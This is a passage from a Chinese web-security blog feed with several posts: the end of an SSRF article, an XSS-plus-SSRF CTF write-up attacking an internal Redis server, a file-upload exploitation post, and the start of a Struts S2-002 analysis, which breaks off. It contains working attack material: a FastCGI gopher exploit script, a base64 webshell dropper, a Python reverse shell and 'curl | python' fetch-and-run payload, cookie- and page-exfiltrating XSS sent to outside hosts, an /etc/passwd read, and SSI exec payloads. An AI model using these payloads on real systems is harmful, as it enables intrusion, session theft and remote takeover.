/usr/local/lib/php/System.php'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-c'</span>, <span class="string">'--code'</span>, help=<span class="string">'What php code your want to execute'</span>, default=<span class="string">''</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-p'</span>, <span class="string">'--port'</span>, help=<span class="string">'FastCGI port'</span>, default=<span class="number">9000</span>, type=int)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = dict()</span><br><span class="line">    documentRoot = <span class="string">"/"</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    content = args.code</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'GATEWAY_INTERFACE'</span>: <span class="string">'FastCGI/1.0'</span>,</span><br><span class="line">        <span class="string">'REQUEST_METHOD'</span>: <span class="string">'POST'</span>,</span><br><span class="line">        <span class="string">'SCRIPT_FILENAME'</span>: documentRoot + uri.lstrip(<span class="string">'/'</span>),</span><br><span class="line">        <span class="string">'SCRIPT_NAME'</span>: uri,</span><br><span class="line">        <span class="string">'QUERY_STRING'</span>: <span class="string">''</span>,</span><br><span class="line">        <span class="string">'REQUEST_URI'</span>: uri,</span><br><span class="line">        <span class="string">'DOCUMENT_ROOT'</span>: documentRoot,</span><br><span class="line">        <span class="string">'SERVER_SOFTWARE'</span>: <span class="string">'php/fcgiclient'</span>,</span><br><span class="line">        <span class="string">'REMOTE_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'REMOTE_PORT'</span>: <span class="string">'9985'</span>,</span><br><span class="line">        <span class="string">'SERVER_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'SERVER_PORT'</span>: <span class="string">'80'</span>,</span><br><span class="line">        <span class="string">'SERVER_NAME'</span>: <span class="string">"localhost"</span>,</span><br><span class="line">        <span class="string">'SERVER_PROTOCOL'</span>: <span class="string">'HTTP/1.1'</span>,</span><br><span class="line">        <span class="string">'CONTENT_TYPE'</span>: <span class="string">'application/text'</span>,</span><br><span class="line">        <span class="string">'CONTENT_LENGTH'</span>: <span class="string">"%d"</span> % len(content),</span><br><span class="line">        <span class="string">'PHP_VALUE'</span>: <span class="string">'auto_prepend_file = php://input'</span>,</span><br><span class="line">        <span class="string">'PHP_ADMIN_VALUE'</span>: <span class="string">'allow_url_include = On'</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = client.request(params, content)</span><br><span class="line">    response = urllib.quote(response)</span><br><span class="line">    print(<span class="string">"gopher://127.0.0.1:"</span> + str(args.port) + <span class="string">"/_"</span> + response)</span><br></pre></td></tr></table></figure></p><p>使用方式<code>python exp.py -c phpcode -p port host filename</code><br>这里需要注意的是，PHP-FRM在接收到请求时，会首先查看要操作的文件是否存在，因此这里需要提供filename并且为已知路径的php文件。<br>如果不知道的话，可以使用服务器安装php时默认安装的php文件<br><img src="https://i.loli.net/2019/05/05/5cced30a820a9.png" alt><br>然后即可利用上面的exp生成payload<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python fastcgi_gopher.py -c "<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">' xxxx &gt;&gt;'</span>;<span class="keyword">echo</span> @<span class="keyword">eval</span>(system(<span class="string">'whoami'</span>));<span class="keyword">exit</span>; <span class="meta">?&gt;</span></span>"  -p 9000 127.0.0.1 /usr/share/php/PEAR/Downloader/Package.php</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/05/05/5cced38475561.png" alt></p><p>通过ssrf漏洞页面提交payload时需要将其再进行一次Url编码<br><img src="https://i.loli.net/2019/05/05/5cced490b73a9.png" alt></p><p>同样可以利用代码执行写入一句话webshell<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python fastcgi_gopher.py -c <span class="string">"&lt;?php file_put_contents('/home/www/html/boogle.php', base64_decode('PD9waHAgZXZhbCgkX1BPU1RbYm9vZ2xlXSk7Pz4=')); ?&gt;"</span>  -p <span class="number">9000</span> <span class="number">127.0</span>.<span class="number">0.1</span> <span class="regexp">/usr/</span>share<span class="regexp">/php/</span>PEAR<span class="regexp">/Downloader/</span><span class="keyword">Package</span>.php</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/05/05/5cceda2c03945.png" alt><br>如果目录没有权限写入的话还可以反弹shell<br>这里使用bash反弹有点问题，改用python。<br>开一个web服务，bash.py中写入<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import <span class="built_in">socket</span>,subprocess,os  </span><br><span class="line">s=<span class="built_in">socket</span>.<span class="built_in">socket</span>(<span class="built_in">socket</span>.AF_INET,<span class="built_in">socket</span>.SOCK_STREAM)  </span><br><span class="line">s.connect((<span class="string">"192.168.111.145"</span>,<span class="number">2333</span>))  </span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)  </span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)  </span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)  </span><br><span class="line">p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>])</span><br></pre></td></tr></table></figure></p><p>然后在<code>192.168.111.145</code>监听<code>2333</code>端口<br>padload如下<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python fastcgi_gopher.py -c "<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(system(<span class="string">'curl http://192.168.111.145/bash.py|python'</span>));<span class="keyword">die</span>(<span class="string">'-------boo--------'</span>); <span class="meta">?&gt;</span></span>" -p 9000 127.0.0.1 /usr/share/php/PEAR/Downloader/Package.php</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/05/06/5ccff09a3fb15.png" alt></p><h2 id="0x06-后记"><a href="#0x06-后记" class="headerlink" title="0x06 后记"></a>0x06 后记</h2><p>本文依照前人经验进行了一波学习，仅在未加任何防护的代码上了进行了ssrf常用手法的测试。<br>ssrf可以说是一扇通往内网的大门，虽然可能会因为种种限制或者没有回显而难以利用，但其一旦被撕开，内网将会深入其害，ssrf姿势千姿百态，日后碰到其他骚姿势将继续记录。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;SSRF（Server-Side RequestForgery）服务端请求伪造，是一种由攻击者构造形
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ssrf" scheme="https://zhengbao.wang/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>XSSRF攻击内网redis</title>
    <link href="https://zhengbao.wang/XSSRF%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91redis/"/>
    <id>https://zhengbao.wang/XSSRF攻击内网redis/</id>
    <published>2019-05-03T03:23:19.000Z</published>
    <updated>2019-05-03T03:24:30.278Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a>0X00 前言</h2><p>由于本菜鸡对xss的认识还停留在弹个框框的层面上，写此文章以求进步。</p><p>在实际过程中经常会出现拿到了cookie，却发现后台登陆在内网的情况，本文刚好发现了这样一个xss测试环境，并且在该环境中进一步利用xss结合ssrf攻击了内网的redis服务器，特此记录。</p><h2 id="0x01-XSS获取管理员cooklie"><a href="#0x01-XSS获取管理员cooklie" class="headerlink" title="0x01 XSS获取管理员cooklie"></a>0x01 XSS获取管理员cooklie</h2><p>环境地址:<a href="https://xssrf.hackme.inndy.tw" target="_blank" rel="noopener">https://xssrf.hackme.inndy.tw</a><br>在该环境中有一个send email的功能，可以给管理员发送含有xss的payload以获取其cookie。<br>这里简单测试。发现过滤了<code>&lt;script</code> <code>(</code> <code>)</code> <code>onerror</code>等关键词。<br><img src="https://i.loli.net/2019/05/01/5cc909e2d34e3.png" alt><br>这里可以看到<code>onerror</code>前面是加了空格的，那么可以用下面的payload染过<br>payload<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">img</span> src=<span class="string">"x"</span>onerror=<span class="string">"document.location='http://ay82rc.ceye.io/'+document.cookie"</span>&gt;</span><br></pre></td></tr></table></figure></p><p>发送后管理员查看即可成功返回cookie。<br><img src="https://i.loli.net/2019/05/01/5cc9093e268dc.png" alt></p><h2 id="0x02-xss登陆内网后台"><a href="#0x02-xss登陆内网后台" class="headerlink" title="0x02 xss登陆内网后台"></a>0x02 xss登陆内网后台</h2><p>拿到cookie后这里直接以cookie登陆，发现限制了管理员需要从内网登陆。这里也符合很多实际场景。<br><img src="https://i.loli.net/2019/05/01/5cc90d4791ba5.png" alt></p><p>那么这里可以直接使用xss然后通过<code>document.body.innerHTML</code>打印出其后台页面。<br>修改上面的payload，但是上面已经过滤<code>()</code>，这里可以使用编码绕过。推荐余弦大大的xss在线编码平台<a href="http://www.xssor.io" target="_blank" rel="noopener">xss’or</a><br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">img</span> src=<span class="string">"x"</span>onerror=<span class="string">"document.location='http://ay82rc.ceye.io/'+btoa(document.body.innerHTML)"</span>&gt;</span><br></pre></td></tr></table></figure></p><p>16进制编码后<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"x"</span>onerror=<span class="string">"&amp;<span class="subst">#x0064</span>;&amp;<span class="subst">#x006f</span>;&amp;<span class="subst">#x0063</span>;&amp;<span class="subst">#x0075</span>;&amp;<span class="subst">#x006d</span>;&amp;<span class="subst">#x0065</span>;&amp;<span class="subst">#x006e</span>;&amp;<span class="subst">#x0074</span>;&amp;<span class="subst">#x002e</span>;&amp;<span class="subst">#x006c</span>;&amp;<span class="subst">#x006f</span>;&amp;<span class="subst">#x0063</span>;&amp;<span class="subst">#x0061</span>;&amp;<span class="subst">#x0074</span>;&amp;<span class="subst">#x0069</span>;&amp;<span class="subst">#x006f</span>;&amp;<span class="subst">#x006e</span>;&amp;<span class="subst">#x003d</span>;&amp;<span class="subst">#x0027</span>;&amp;<span class="subst">#x0068</span>;&amp;<span class="subst">#x0074</span>;&amp;<span class="subst">#x0074</span>;&amp;<span class="subst">#x0070</span>;&amp;<span class="subst">#x003a</span>;&amp;<span class="subst">#x002f</span>;&amp;<span class="subst">#x002f</span>;&amp;<span class="subst">#x0061</span>;&amp;<span class="subst">#x0079</span>;&amp;<span class="subst">#x0038</span>;&amp;<span class="subst">#x0032</span>;&amp;<span class="subst">#x0072</span>;&amp;<span class="subst">#x0063</span>;&amp;<span class="subst">#x002e</span>;&amp;<span class="subst">#x0063</span>;&amp;<span class="subst">#x0065</span>;&amp;<span class="subst">#x0079</span>;&amp;<span class="subst">#x0065</span>;&amp;<span class="subst">#x002e</span>;&amp;<span class="subst">#x0069</span>;&amp;<span class="subst">#x006f</span>;&amp;<span class="subst">#x002f</span>;&amp;<span class="subst">#x0027</span>;&amp;<span class="subst">#x002b</span>;&amp;<span class="subst">#x0062</span>;&amp;<span class="subst">#x0074</span>;&amp;<span class="subst">#x006f</span>;&amp;<span class="subst">#x0061</span>;&amp;<span class="subst">#x0028</span>;&amp;<span class="subst">#x0064</span>;&amp;<span class="subst">#x006f</span>;&amp;<span class="subst">#x0063</span>;&amp;<span class="subst">#x0075</span>;&amp;<span class="subst">#x006d</span>;&amp;<span class="subst">#x0065</span>;&amp;<span class="subst">#x006e</span>;&amp;<span class="subst">#x0074</span>;&amp;<span class="subst">#x002e</span>;&amp;<span class="subst">#x0062</span>;&amp;<span class="subst">#x006f</span>;&amp;<span class="subst">#x0064</span>;&amp;<span class="subst">#x0079</span>;&amp;<span class="subst">#x002e</span>;&amp;<span class="subst">#x0069</span>;&amp;<span class="subst">#x006e</span>;&amp;<span class="subst">#x006e</span>;&amp;<span class="subst">#x0065</span>;&amp;<span class="subst">#x0072</span>;&amp;<span class="subst">#x0048</span>;&amp;<span class="subst">#x0054</span>;&amp;<span class="subst">#x004d</span>;&amp;<span class="subst">#x004c</span>;&amp;<span class="subst">#x0029</span>;"</span>&gt;</span><br></pre></td></tr></table></figure></p><p>成功获取到内容<br><img src="https://i.loli.net/2019/05/01/5cc911cf367de.png" alt><br>将内容base64解码<br><img src="https://i.loli.net/2019/05/01/5cc912d520bb9.png" alt><br>保存为html即可看到后台内容,并且登陆账号为admin。<br><img src="https://i.loli.net/2019/05/01/5cc913781b339.png" alt></p><p>这里可以看到两个管理员所特有的功能点<code>set admin</code> <code>send request</code><br>继续获取一下<code>request.php</code>的内容<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attr">src="x"onerror="</span></span><br><span class="line"><span class="attr">xmlhttp</span> = new XMLHttpRequest();</span><br><span class="line">xmlhttp.<span class="attr">onreadystatechange=function()&#123;</span></span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.<span class="attr">readyState</span> == <span class="number">4</span> &amp;&amp; xmlhttp.<span class="attr">status</span> == <span class="number">200</span>)&#123;</span><br><span class="line">        document.<span class="attr">location</span> = 'http://zhengbao.wang?'+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(<span class="string">"GET"</span>,<span class="string">"request.php"</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.send();</span><br><span class="line"><span class="string">"&gt;</span></span><br></pre></td></tr></table></figure></p><p>将payload编码发送,注意这里ceye服务器收不到回显，不知为何，改用自己的vps</p><p>成功读取到<code>request.php</code>页面内容。<br><img src="https://i.loli.net/2019/05/02/5ccaefd42756d.png" alt><br>base64解码后看到有发送url的操作，这里猜测具有ssrf<br><img src="https://i.loli.net/2019/05/02/5ccaf0a0811e6.png" alt></p><h2 id="0x02-xssrf-file协议任意文件读取"><a href="#0x02-xssrf-file协议任意文件读取" class="headerlink" title="0x02 xssrf file协议任意文件读取"></a>0x02 xssrf file协议任意文件读取</h2><p>继续构造payload，利用ssrf通过<code>file</code>协议读取<code>/etc/passwd</code><br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attr">src="x"onerror="</span></span><br><span class="line"><span class="attr">xmlhttp</span> = new XMLHttpRequest();</span><br><span class="line">xmlhttp.<span class="attr">onreadystatechange=function()&#123;</span></span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.<span class="attr">readyState</span> == <span class="number">4</span> &amp;&amp; xmlhttp.<span class="attr">status</span> == <span class="number">200</span>)&#123;</span><br><span class="line">        document.<span class="attr">location</span> = 'http://zhengbao.wang?'+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(<span class="string">"POST"</span>,<span class="string">"request.php"</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">xmlhttp.send(<span class="string">"url=file:///etc/passwd"</span>);</span><br><span class="line"><span class="string">"&gt;</span></span><br></pre></td></tr></table></figure></p><p>发现可以获取到<code>/etc/passwd</code><br><img src="https://i.loli.net/2019/05/02/5ccaf3ca9a921.png" alt><br>至此已经可以任意文件读取了，这是一道ctf题目，在robots.txt中提示让读取<code>config.php</code><br><img src="https://i.loli.net/2019/05/02/5ccaf46a09ad6.png" alt><br>那么我们便可以继续修改上面的payload读取config.php。<br><img src="https://i.loli.net/2019/05/02/5ccaf6a42d22d.png" alt><br>进一步获取到在内网<code>25566</code>端口运行着<code>redis</code><br>那么便可以通过<code>gopher</code>协议去攻击内网redis了。</p><h2 id="0X04-xssrf-gopher协议攻击内网redis"><a href="#0X04-xssrf-gopher协议攻击内网redis" class="headerlink" title="0X04 xssrf gopher协议攻击内网redis"></a>0X04 xssrf gopher协议攻击内网redis</h2><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attr">src="x"onerror="</span></span><br><span class="line"><span class="attr">xmlhttp</span> = new XMLHttpRequest();</span><br><span class="line">xmlhttp.<span class="attr">onreadystatechange=function()&#123;</span></span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.<span class="attr">readyState</span> == <span class="number">4</span> &amp;&amp; xmlhttp.<span class="attr">status</span> == <span class="number">200</span>)&#123;</span><br><span class="line">        document.<span class="attr">location</span> = 'http://zhengbao.wang?'+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(<span class="string">"POST"</span>,<span class="string">"request.php"</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">xmlhttp.send(<span class="string">"url=gopher://127.0.0.1:25566/_info%250a_quit"</span>);</span><br><span class="line"><span class="string">"&gt;</span></span><br></pre></td></tr></table></figure><p>成功获得redis info信息。<br><img src="https://i.loli.net/2019/05/03/5ccbb184d23dd.png" alt></p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p><a href="https://skysec.top/2018/08/17/xss-ssrf-redis/" target="_blank" rel="noopener">https://skysec.top/2018/08/17/xss-ssrf-redis/</a><br><a href="https://www.kingkk.com/2018/08/redis未授权访问与ssrf利用" target="_blank" rel="noopener">https://www.kingkk.com/2018/08/redis未授权访问与ssrf利用</a><br><a href="https://www.cnblogs.com/go2bed/p/4136358.html" target="_blank" rel="noopener">https://www.cnblogs.com/go2bed/p/4136358.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0X00-前言&quot;&gt;&lt;a href=&quot;#0X00-前言&quot; class=&quot;headerlink&quot; title=&quot;0X00 前言&quot;&gt;&lt;/a&gt;0X00 前言&lt;/h2&gt;&lt;p&gt;由于本菜鸡对xss的认识还停留在弹个框框的层面上，写此文章以求进步。&lt;/p&gt;
&lt;p&gt;在实际过程中经常
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ssrf" scheme="https://zhengbao.wang/tags/ssrf/"/>
    
      <category term="xss" scheme="https://zhengbao.wang/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>文件上传功能的一些另类利用</title>
    <link href="https://zhengbao.wang/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8A%9F%E8%83%BD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8F%A6%E7%B1%BB%E5%88%A9%E7%94%A8/"/>
    <id>https://zhengbao.wang/文件上传功能的一些另类利用/</id>
    <published>2019-04-20T15:35:16.000Z</published>
    <updated>2019-04-20T15:36:40.243Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在实际环境中，可能会遇到各种各样的上传点，但是服务端肯定会做各种限制导致脚本无法上传或者上传后限制了解析。那么在这种情况下如何去挖掘上传点的其他一些利用方式呢，下面看一下大佬们的其他骚操作。</p><h2 id="0x01-XSS"><a href="#0x01-XSS" class="headerlink" title="0x01 XSS"></a>0x01 XSS</h2><p>关于利用文件上传的XSS,早在16年大佬就给出了多种利用方式：<a href="http://brutelogic.com.br/blog/file-upload-xss/" target="_blank" rel="noopener">File Upload XSS</a></p><h3 id="文件名xss"><a href="#文件名xss" class="headerlink" title="文件名xss"></a>文件名xss</h3><p>windows下文件名不能包含 <code>/ \ : * ? “ &lt; &gt; |</code> 字符，而linux下是可以出现除 <code>/</code> 字符之外的其它所有的字符，而且在Linux系统中可以使用长文件或目录名，直接利用这个特性，在上传点没有对文件名进行检测和处理的情况下就可以实现XSS攻击。</p><h3 id="svg文件"><a href="#svg文件" class="headerlink" title="svg文件"></a>svg文件</h3><p>svg它的英文全称为Scalable Vector Graphics，意思为可缩放的矢量图形，是一种图片文件格式。当服务端允许上传svg类型的文件时，可进行Xss。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg <span class="attribute">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attribute">onload</span>=<span class="string">"alert("</span>svg-xss")/&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/20/5cbb33464fbca.png" alt></p><h2 id="0x02-SSI-Injection"><a href="#0x02-SSI-Injection" class="headerlink" title="0x02 SSI Injection"></a>0x02 SSI Injection</h2><p>SSI是英文Server Side Includes的缩写，翻译成中文就是服务器端包含的意思。从技术角度上说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针。SSI具有强大的功能，只要使用一条简单的SSI命令就可以实现整个网站的内容更新，时间和日期的动态显示，以及执行shell和CGI脚本程序等复杂的功能。<br>详细参考<a href="https://www.owasp.org/index.php/Server-Side_Includes_%28SSI%29_Injection" target="_blank" rel="noopener">https://www.owasp.org/index.php/Server-Side_Includes_%28SSI%29_Injection</a></p><p>也就说一个web服务如果开启了SSI功能，即可通过上传<code>shtml</code>进行文件读取甚至命令执行。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">Linux:</span><br><span class="line"></span><br><span class="line">List files <span class="keyword">of</span> directory:</span><br><span class="line"></span><br><span class="line">&lt;!--#exec cmd="ls" --&gt;</span><br><span class="line">Access directories:</span><br><span class="line"></span><br><span class="line">&lt;!--#exec cmd="cd /root/dir/"&gt;</span><br><span class="line">Execution script:</span><br><span class="line"></span><br><span class="line">&lt;!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" --&gt;</span><br><span class="line">Windows:</span><br><span class="line"></span><br><span class="line">List files <span class="keyword">of</span> directory:</span><br><span class="line"></span><br><span class="line">&lt;!--#exec cmd="dir" --&gt;</span><br><span class="line">Access directories:</span><br><span class="line"></span><br><span class="line">&lt;!--#exec cmd="cd C:\admin\dir"&gt;</span><br></pre></td></tr></table></figure></p><h2 id="0X03-SSRF"><a href="#0X03-SSRF" class="headerlink" title="0X03 SSRF"></a>0X03 SSRF</h2><p>参考<a href="https://nosec.org/home/detail/2305.html" target="_blank" rel="noopener">利用SVG图片和SSRF收集服务器内部信息</a><br>该利用同样需要支持上传<code>svg</code>文件，由于它是xml结构，所以支持各种xml特性，其中一个特性是XLink，支持在xml文档中创建内部或外部的超链接。<br>上传<code>ssrf.xml</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns:svg</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">xmlns:xlink</span>=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attr">width</span>=<span class="string">"200"</span> <span class="attr">height</span>=<span class="string">"200"</span>&gt;</span><span class="tag">&lt;<span class="name">image</span> <span class="attr">height</span>=<span class="string">"30"</span> <span class="attr">width</span>=<span class="string">"30"</span> <span class="attr">xlink:href</span>=<span class="string">"http://192.168.111.149:3000/?ssrfsvg"</span> /&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/20/5cbb3846adbf8.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;在实际环境中，可能会遇到各种各样的上传点，但是服务端肯定会做各种限制导致脚本无法上传或者上传后限制了
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="文件上传" scheme="https://zhengbao.wang/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>java代码审计入门之s2-002复现分析</title>
    <link href="https://zhengbao.wang/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E4%B9%8Bs2-002%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"/>
    <id>https://zhengbao.wang/java代码审计入门之s2-002复现分析/</id>
    <published>2019-04-17T04:25:20.000Z</published>
    <updated>2019-04-17T08:30:01.754Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>入门JAVA代码审计的第二篇文章，复现分析<code>S2-002</code> xss漏洞。</p><p>本篇在漏洞分析的基础上，重点追踪了struts2标签解析过程。</p><h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><p>官方公告中给出的漏洞影响版本为Struts 2.0.0 - Struts 2.0.11，因此本环境可以在之前分析<code>s1-001</code>漏洞环境上搭建，可参考前面的文章<a href="https://zhengbao.wang/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E4%B9%8Bs2-001%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">java代码审计入门之s2-001复现分析</a></p><p>在上面环境的基础上，继续创建<code>xss_test.jsp</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">taglib</span> <span class="attr">prefix</span>=<span class="string">"s"</span> <span class="attr">uri</span>=<span class="string">"/struts-tags"</span> %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">contentType</span>=<span class="string">"text/html;charset=UTF-8"</span> <span class="attr">language</span>=<span class="string">"java"</span> %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>S2-002<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&lt;s:url action="</span><span class="attr">Xss</span>" <span class="attr">includeParams</span>=<span class="string">"all"</span> &gt;</span><span class="tag">&lt;/<span class="name">s:url</span>&gt;</span>"&gt;你好Struts2<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>创建<code>Xss.java</code> class<br><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.action;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.<span class="type">ActionSupport</span>;</span><br><span class="line">public <span class="class"><span 